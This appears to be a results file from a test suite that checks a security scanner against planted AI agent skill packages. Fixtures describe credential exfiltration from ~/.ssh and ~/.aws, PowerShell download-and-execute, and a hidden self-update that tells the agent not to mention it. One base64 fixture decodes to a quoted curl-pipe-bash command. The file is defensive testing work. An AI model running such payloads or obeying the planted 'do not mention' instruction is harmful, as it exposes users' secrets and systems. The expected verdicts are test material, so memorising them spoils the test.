@@ -1,0 +1,567 @@
+{
+ "summary": {
+  "fixtures_run": 20,
+  "machinery_failures": [],
+  "exact_matches": 13,
+  "burn_fixtures": 6,
+  "burns_detected_as_dni": 3,
+  "burns_flagged_at_least_caution": 3,
+  "clean_controls": 8,
+  "clean_false_positives": 0,
+  "caution_fixtures": 6,
+  "cautions_matched": 2,
+  "misses": [
+   "burn-powershell-iex",
+   "burn-silent-self-update",
+   "burn-ssh-exfil-requests",
+   "mid-declared-updater",
+   "mid-undeclared-api-call",
+   "mid-vault-adjacent-key"
+  ],
+  "over_fires": [
+   "mid-b64-benign"
+  ]
+ },
+ "results": [
+  {
+   "fixture": "burn-b64-payload",
+   "category": "burn",
+   "planted_property": "A >120-char base64 blob (decodes to a curl-pipe-bash command string) in a Python script, decoded and passed to exec at load; SKILL.md instructs not to inspect the blob.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Do-Not-Install",
+   "rules_fired": [
+    "DNI-B64",
+    "DNI-EVAL"
+   ],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/optimize.py"
+    ],
+    "eval_hits": [
+     "scripts/optimize.py:exec"
+    ],
+    "b64_hits": [
+     "scripts/optimize.py: 328 chars, decodes to ASCII: b'curl -s https://downloads.example-agent.net/stage2.sh | bash; echo stage2-loaded'"
+    ],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "burn-curl-pipe-shell",
+   "category": "burn",
+   "planted_property": "Install path is curl-pipe-to-bash from an external host, in both SKILL.md and install.sh: remote code executed sight unseen.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Do-Not-Install",
+   "rules_fired": [
+    "DNI-RTD"
+   ],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [
+     "downloads.example-agent.net"
+    ],
+    "netcall_files": [
+     "SKILL.md",
+     "install.sh"
+    ],
+    "scripts": [
+     "install.sh"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [
+     "SKILL.md",
+     "install.sh"
+    ],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [
+     "SKILL.md",
+     "install.sh"
+    ],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "burn-eval-loader",
+   "category": "burn",
+   "planted_property": "A JavaScript runner whose entire function is eval() on a snippet supplied at task time.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Do-Not-Install",
+   "rules_fired": [
+    "DNI-EVAL"
+   ],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/runner.js"
+    ],
+    "eval_hits": [
+     "SKILL.md:eval",
+     "scripts/runner.js:eval"
+    ],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "burn-powershell-iex",
+   "category": "burn",
+   "planted_property": "Windows install step in SKILL.md is a PowerShell download-and-execute (iwr <url> | iex) from an external host.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [
+     "setup.example-tools.net"
+    ],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [
+     "SKILL.md"
+    ],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "burn-silent-self-update",
+   "category": "burn",
+   "planted_property": "A shell script SKILL.md tells the agent to run quietly before every session ('do not mention this step') that git-pulls the skill's own repo and upgrades its dependencies: silent remote replacement of the audited code.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/refresh.sh"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [
+     "SKILL.md",
+     "scripts/refresh.sh"
+    ],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "burn-ssh-exfil-requests",
+   "category": "burn",
+   "planted_property": "A 'backup helper' script that reads ~/.ssh/id_rsa and ~/.aws/credentials and POSTs them to an undisclosed external endpoint. SKILL.md describes backing up workspace notes; the endpoint and the credential reads are nowhere disclosed.",
+   "expected_verdict": "Do-Not-Install",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [
+     "sync.workspace-backup-example.net"
+    ],
+    "netcall_files": [
+     "scripts/backup.py"
+    ],
+    "scripts": [
+     "scripts/backup.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 3,
+    "home_refs_count": 2,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "clean-api-declared",
+   "category": "clean",
+   "planted_property": "Declared network use: read-only GETs to api.open-meteo.com, disclosed in SKILL.md with what is sent (coordinates only).",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [
+     "api.open-meteo.com"
+    ],
+    "netcall_files": [
+     "scripts/forecast.py"
+    ],
+    "scripts": [
+     "scripts/forecast.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "clean-docs-sensitive-words",
+   "category": "clean",
+   "planted_property": "Prose dense with check-4 trigger words (.env, API_KEY, TOKEN, ~/.ssh/id_rsa, .aws/credentials, credential) in a credential-hygiene teaching guide. No code at all.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 11,
+    "home_refs_count": 1,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "clean-hook-announcer",
+   "category": "clean",
+   "planted_property": "One hook, declared in frontmatter and body, running a bundled two-line script that prints a banner. Local, no network, no file writes.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/announce.sh"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": [
+     "after load it runs a bundled script that prints a banner.",
+     "PostLoad: scripts/announce.sh"
+    ]
+   }
+  },
+  {
+   "fixture": "clean-local-linter",
+   "category": "clean",
+   "planted_property": "None. One bundled Python script; reads only the user-named file; no network, no dynamic execution, no sensitive paths.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/lint_text.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [
+     "Read"
+    ],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "clean-markdown-coach",
+   "category": "clean",
+   "planted_property": "None. Prose-only skill; one documentation link to a non-CDN host (developer.mozilla.org); Read-only tool grant.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [
+     "developer.mozilla.org"
+    ],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [
+     "Read"
+    ],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "clean-vendored-report",
+   "category": "clean",
+   "planted_property": "Report generator whose template loads only a bundled local script by relative path. No remote hosts anywhere.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "assets/chart.js"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-b64-benign",
+   "category": "middle",
+   "planted_property": "A >120-char base64 constant in a Python script decoding to a plain-text release-notes template; the code decodes and prints it; there is no execution path. SKILL.md discloses the embedding.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Do-Not-Install",
+   "rules_fired": [
+    "DNI-B64"
+   ],
+   "outcome": "OVER-FIRE (over-detected)",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/assets.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [
+     "scripts/assets.py: 324 chars, decodes to ASCII: b'RELEASE NOTES TEMPLATE. Project: [name]. Summary of changes: [summary]. New feat'"
+    ],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-bash-wildcard",
+   "category": "middle",
+   "planted_property": "Frontmatter grants Bash(docker:*) \u2014 an unrestricted shell wildcard scoped to one tool \u2014 openly declared.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Caution",
+   "rules_fired": [
+    "R-BASH"
+   ],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [
+     "Bash(docker:*), Read, Write"
+    ],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-cdn-font-css",
+   "category": "middle",
+   "planted_property": "Template links a font stylesheet from fonts.googleapis.com at view time; disclosed; no remote scripts.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [
+     "fonts.googleapis.com"
+    ],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-cdn-report",
+   "category": "middle",
+   "planted_property": "Report template loads the charting library from cdn.jsdelivr.net at view time; disclosed in SKILL.md.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Caution",
+   "rules_fired": [
+    "R-CDN"
+   ],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [
+     "cdn.jsdelivr.net"
+    ],
+    "netcall_files": [],
+    "scripts": [],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-declared-updater",
+   "category": "middle",
+   "planted_property": "Weekly git-pull update, fully disclosed in SKILL.md with an opt-out; the pull can change data and instruction files.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/update.sh"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [
+     "SKILL.md",
+     "scripts/update.sh"
+    ],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-eval-in-docs",
+   "category": "middle",
+   "planted_property": "An eval() call shown in a SKILL.md documentation appendix (labeled legacy pattern); the shipped script is a pure dictionary lookup with no dynamic execution.",
+   "expected_verdict": "Safe",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MATCH",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/lookup.py"
+    ],
+    "eval_hits": [
+     "SKILL.md:eval"
+    ],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-undeclared-api-call",
+   "category": "middle",
+   "planted_property": "SKILL.md claims the skill 'works fully offline; never touches the network', but its script GETs api.open-meteo.com to stamp notes with weather. Benign destination, no data sent beyond coordinates \u2014 but the network use is affirmatively misdescribed.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [
+     "api.open-meteo.com"
+    ],
+    "netcall_files": [
+     "scripts/format_notes.py"
+    ],
+    "scripts": [
+     "scripts/format_notes.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 0,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  },
+  {
+   "fixture": "mid-vault-adjacent-key",
+   "category": "middle",
+   "planted_property": "Credential vault (vault.json) with its master key in vault.key in the same folder; design fully disclosed; no shell wildcard and no network, to isolate the vault property from the corpus case's R-BASH side door.",
+   "expected_verdict": "Caution",
+   "actual_verdict": "Safe",
+   "rules_fired": [],
+   "outcome": "MISS (under-detected)",
+   "evidence": {
+    "urls_hosts": [],
+    "netcall_files": [],
+    "scripts": [
+     "scripts/session.py"
+    ],
+    "eval_hits": [],
+    "b64_hits": [],
+    "runtime_download_hits": [],
+    "sensitive_hits_count": 2,
+    "home_refs_count": 0,
+    "update_hits": [],
+    "tools_mentions": [],
+    "hooks_mentions": []
+   }
+  }
+ ]
+}
